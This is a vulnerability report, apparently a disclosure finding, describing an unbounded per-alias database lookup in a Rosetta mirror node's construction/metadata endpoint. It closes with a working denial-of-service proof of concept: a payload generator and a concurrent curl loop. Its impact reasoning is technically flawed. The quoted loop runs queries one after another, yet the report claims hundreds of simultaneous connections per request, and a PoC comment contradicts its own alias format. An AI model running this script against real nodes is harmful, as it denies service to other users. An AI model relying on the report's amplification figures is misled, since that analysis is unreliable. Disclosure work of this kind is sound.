### Title
Unbounded Alias Loop in `resolveAccountAliases` Exhausts Database Connection Pool via Single Unauthenticated Request

### Summary
The `resolveAccountAliases()` function in `rosetta/app/services/construction_service.go` iterates over every comma-separated alias in the `account_aliases` option and issues one synchronous database query per alias with no upper bound on alias count. Any unauthenticated caller of the `/construction/metadata` endpoint can supply an arbitrarily large alias list in a single request, driving the database connection pool to exhaustion and denying service to all other consumers of the mirror node, including network nodes.

### Finding Description
**Exact code path:**

`ConstructionMetadata` (line 159) calls `resolveAccountAliases` (line 557). Inside `resolveAccountAliases` (lines 575–586), the function splits the raw string on commas and, for every token, calls `c.accountRepo.GetAccountId(ctx, accountId)` — a blocking database round-trip:

```go
// construction_service.go:575-586
for accountAlias := range strings.SplitSeq(accountAliases, ",") {
    accountId, err := types.NewAccountIdFromString(accountAlias, c.systemShard, c.systemRealm)
    if err != nil {
        return emptyResult, errors.ErrInvalidAccount
    }
    found, rErr := c.accountRepo.GetAccountId(ctx, accountId)   // ← one DB query per alias
    if rErr != nil {
        return emptyResult, rErr
    }
    accountMap = append(accountMap, fmt.Sprintf("%s:%s", accountAlias, found))
}
```

`GetAccountId` (account.go lines 146–158) acquires a connection from the pool and executes a raw SQL query for every call:

```go
db, cancel := ar.dbClient.GetDbWithContext(ctx)
defer cancel()
db.Raw(selectCurrentCryptoEntityByAlias, sql.Named("alias", accountId.GetAlias())).First(&entity)
```

**Root cause:** There is no cap on the number of aliases accepted, no batching of queries, and no caching of alias lookups inside this path.

**Why existing checks fail:**

| Check | Why insufficient |
|---|---|
| Alias format validation (`NewAccountIdFromString`) | Only validates format; trivially satisfied with valid-looking alias strings |
| HTTP `ReadTimeout: 5s` (main.go line 225) | At typical network speeds, tens of thousands of alias tokens can be delivered within 5 seconds |
| No `http.MaxBytesReader` | No body size cap is set anywhere in `main.go` lines 220–227 |
| Traefik rate-limit middleware | Defined in `values.yaml` lines 157–161 but gated on `global.middleware: true`; the default is `global.middleware: false` (line 95), so it is **off by default** |
| DB `statementTimeout: 20s` | Limits per-query duration, not the total number of concurrent connections consumed |
| DB `maxOpenConnections: 100` | This is the ceiling being attacked, not a protection |

### Impact Explanation
The database connection pool is capped at 100 open connections by default (`hiero.mirror.rosetta.db.pool.maxOpenConnections = 100`). A single request carrying ~200 aliases will hold connections for the full `statementTimeout` window (20 s). Two or three concurrent such requests saturate the pool entirely. All subsequent database-backed endpoints — account balance queries, block queries, and any other mirror-node service sharing the same pool — queue indefinitely or return errors. This directly degrades the mirror node's ability to serve network nodes that rely on it for state data, meeting the stated impact threshold.

### Likelihood Explanation
The `/construction/metadata` endpoint is part of the public Rosetta API, reachable by any HTTP client with no authentication. The attacker needs only to know the endpoint path and the `account_aliases` option key (both documented in the Rosetta spec and the codebase). The attack is repeatable, requires no special tooling beyond `curl`, and is effective even from a single IP when the Traefik middleware is absent (the default deployment). The alias strings need only satisfy the format check — they do not need to correspond to real accounts, because `GetAccountId` still executes the DB query and returns `ErrAccountNotFound` only after the query completes.

### Recommendation
1. **Enforce an alias count cap** inside `resolveAccountAliases` before entering the loop — e.g., reject requests where `strings.Count(accountAliases, ",") >= maxAliasCount` for a small constant (e.g., 10).
2. **Batch the alias lookups** into a single `IN (...)` query rather than N sequential queries.
3. **Enable the Traefik middleware by default** (`global.middleware: true`) and set `inFlightReq.amount` to a value that accounts for the amplification factor.
4. **Add an HTTP body size limit** via `http.MaxBytesReader` in `main.go` before the request body is parsed.

### Proof of Concept
```bash
# Generate a payload with 500 syntactically valid alias tokens
# (aliases need not exist; the DB query still runs and returns ErrAccountNotFound)
python3 -c "
import json, base64, hashlib
# A valid alias is a base32-encoded ed25519 public key; use repeated dummy keys
alias = '0x' + 'aa' * 32   # 32-byte hex alias
aliases = ','.join([alias] * 500)
payload = {
  'network_identifier': {'blockchain': 'Hedera', 'network': 'testnet'},
  'options': {
    'operation_type': 'CRYPTOCURRENCYTRANSFER',
    'account_aliases': aliases
  }
}
print(json.dumps(payload))
" > payload.json

# Send concurrently from multiple terminals to exhaust the pool
for i in $(seq 1 5); do
  curl -s -X POST http://<mirror-node>:5700/construction/metadata \
       -H 'Content-Type: application/json' \
       -d @payload.json &
done
wait
# Subsequent legitimate requests will time out or return DB errors
```

Each of the 5 concurrent requests triggers 500 DB queries, totalling 2,500 simultaneous connection attempts against a pool of 100, causing full pool exhaustion for the duration of the `statementTimeout` (20 s).
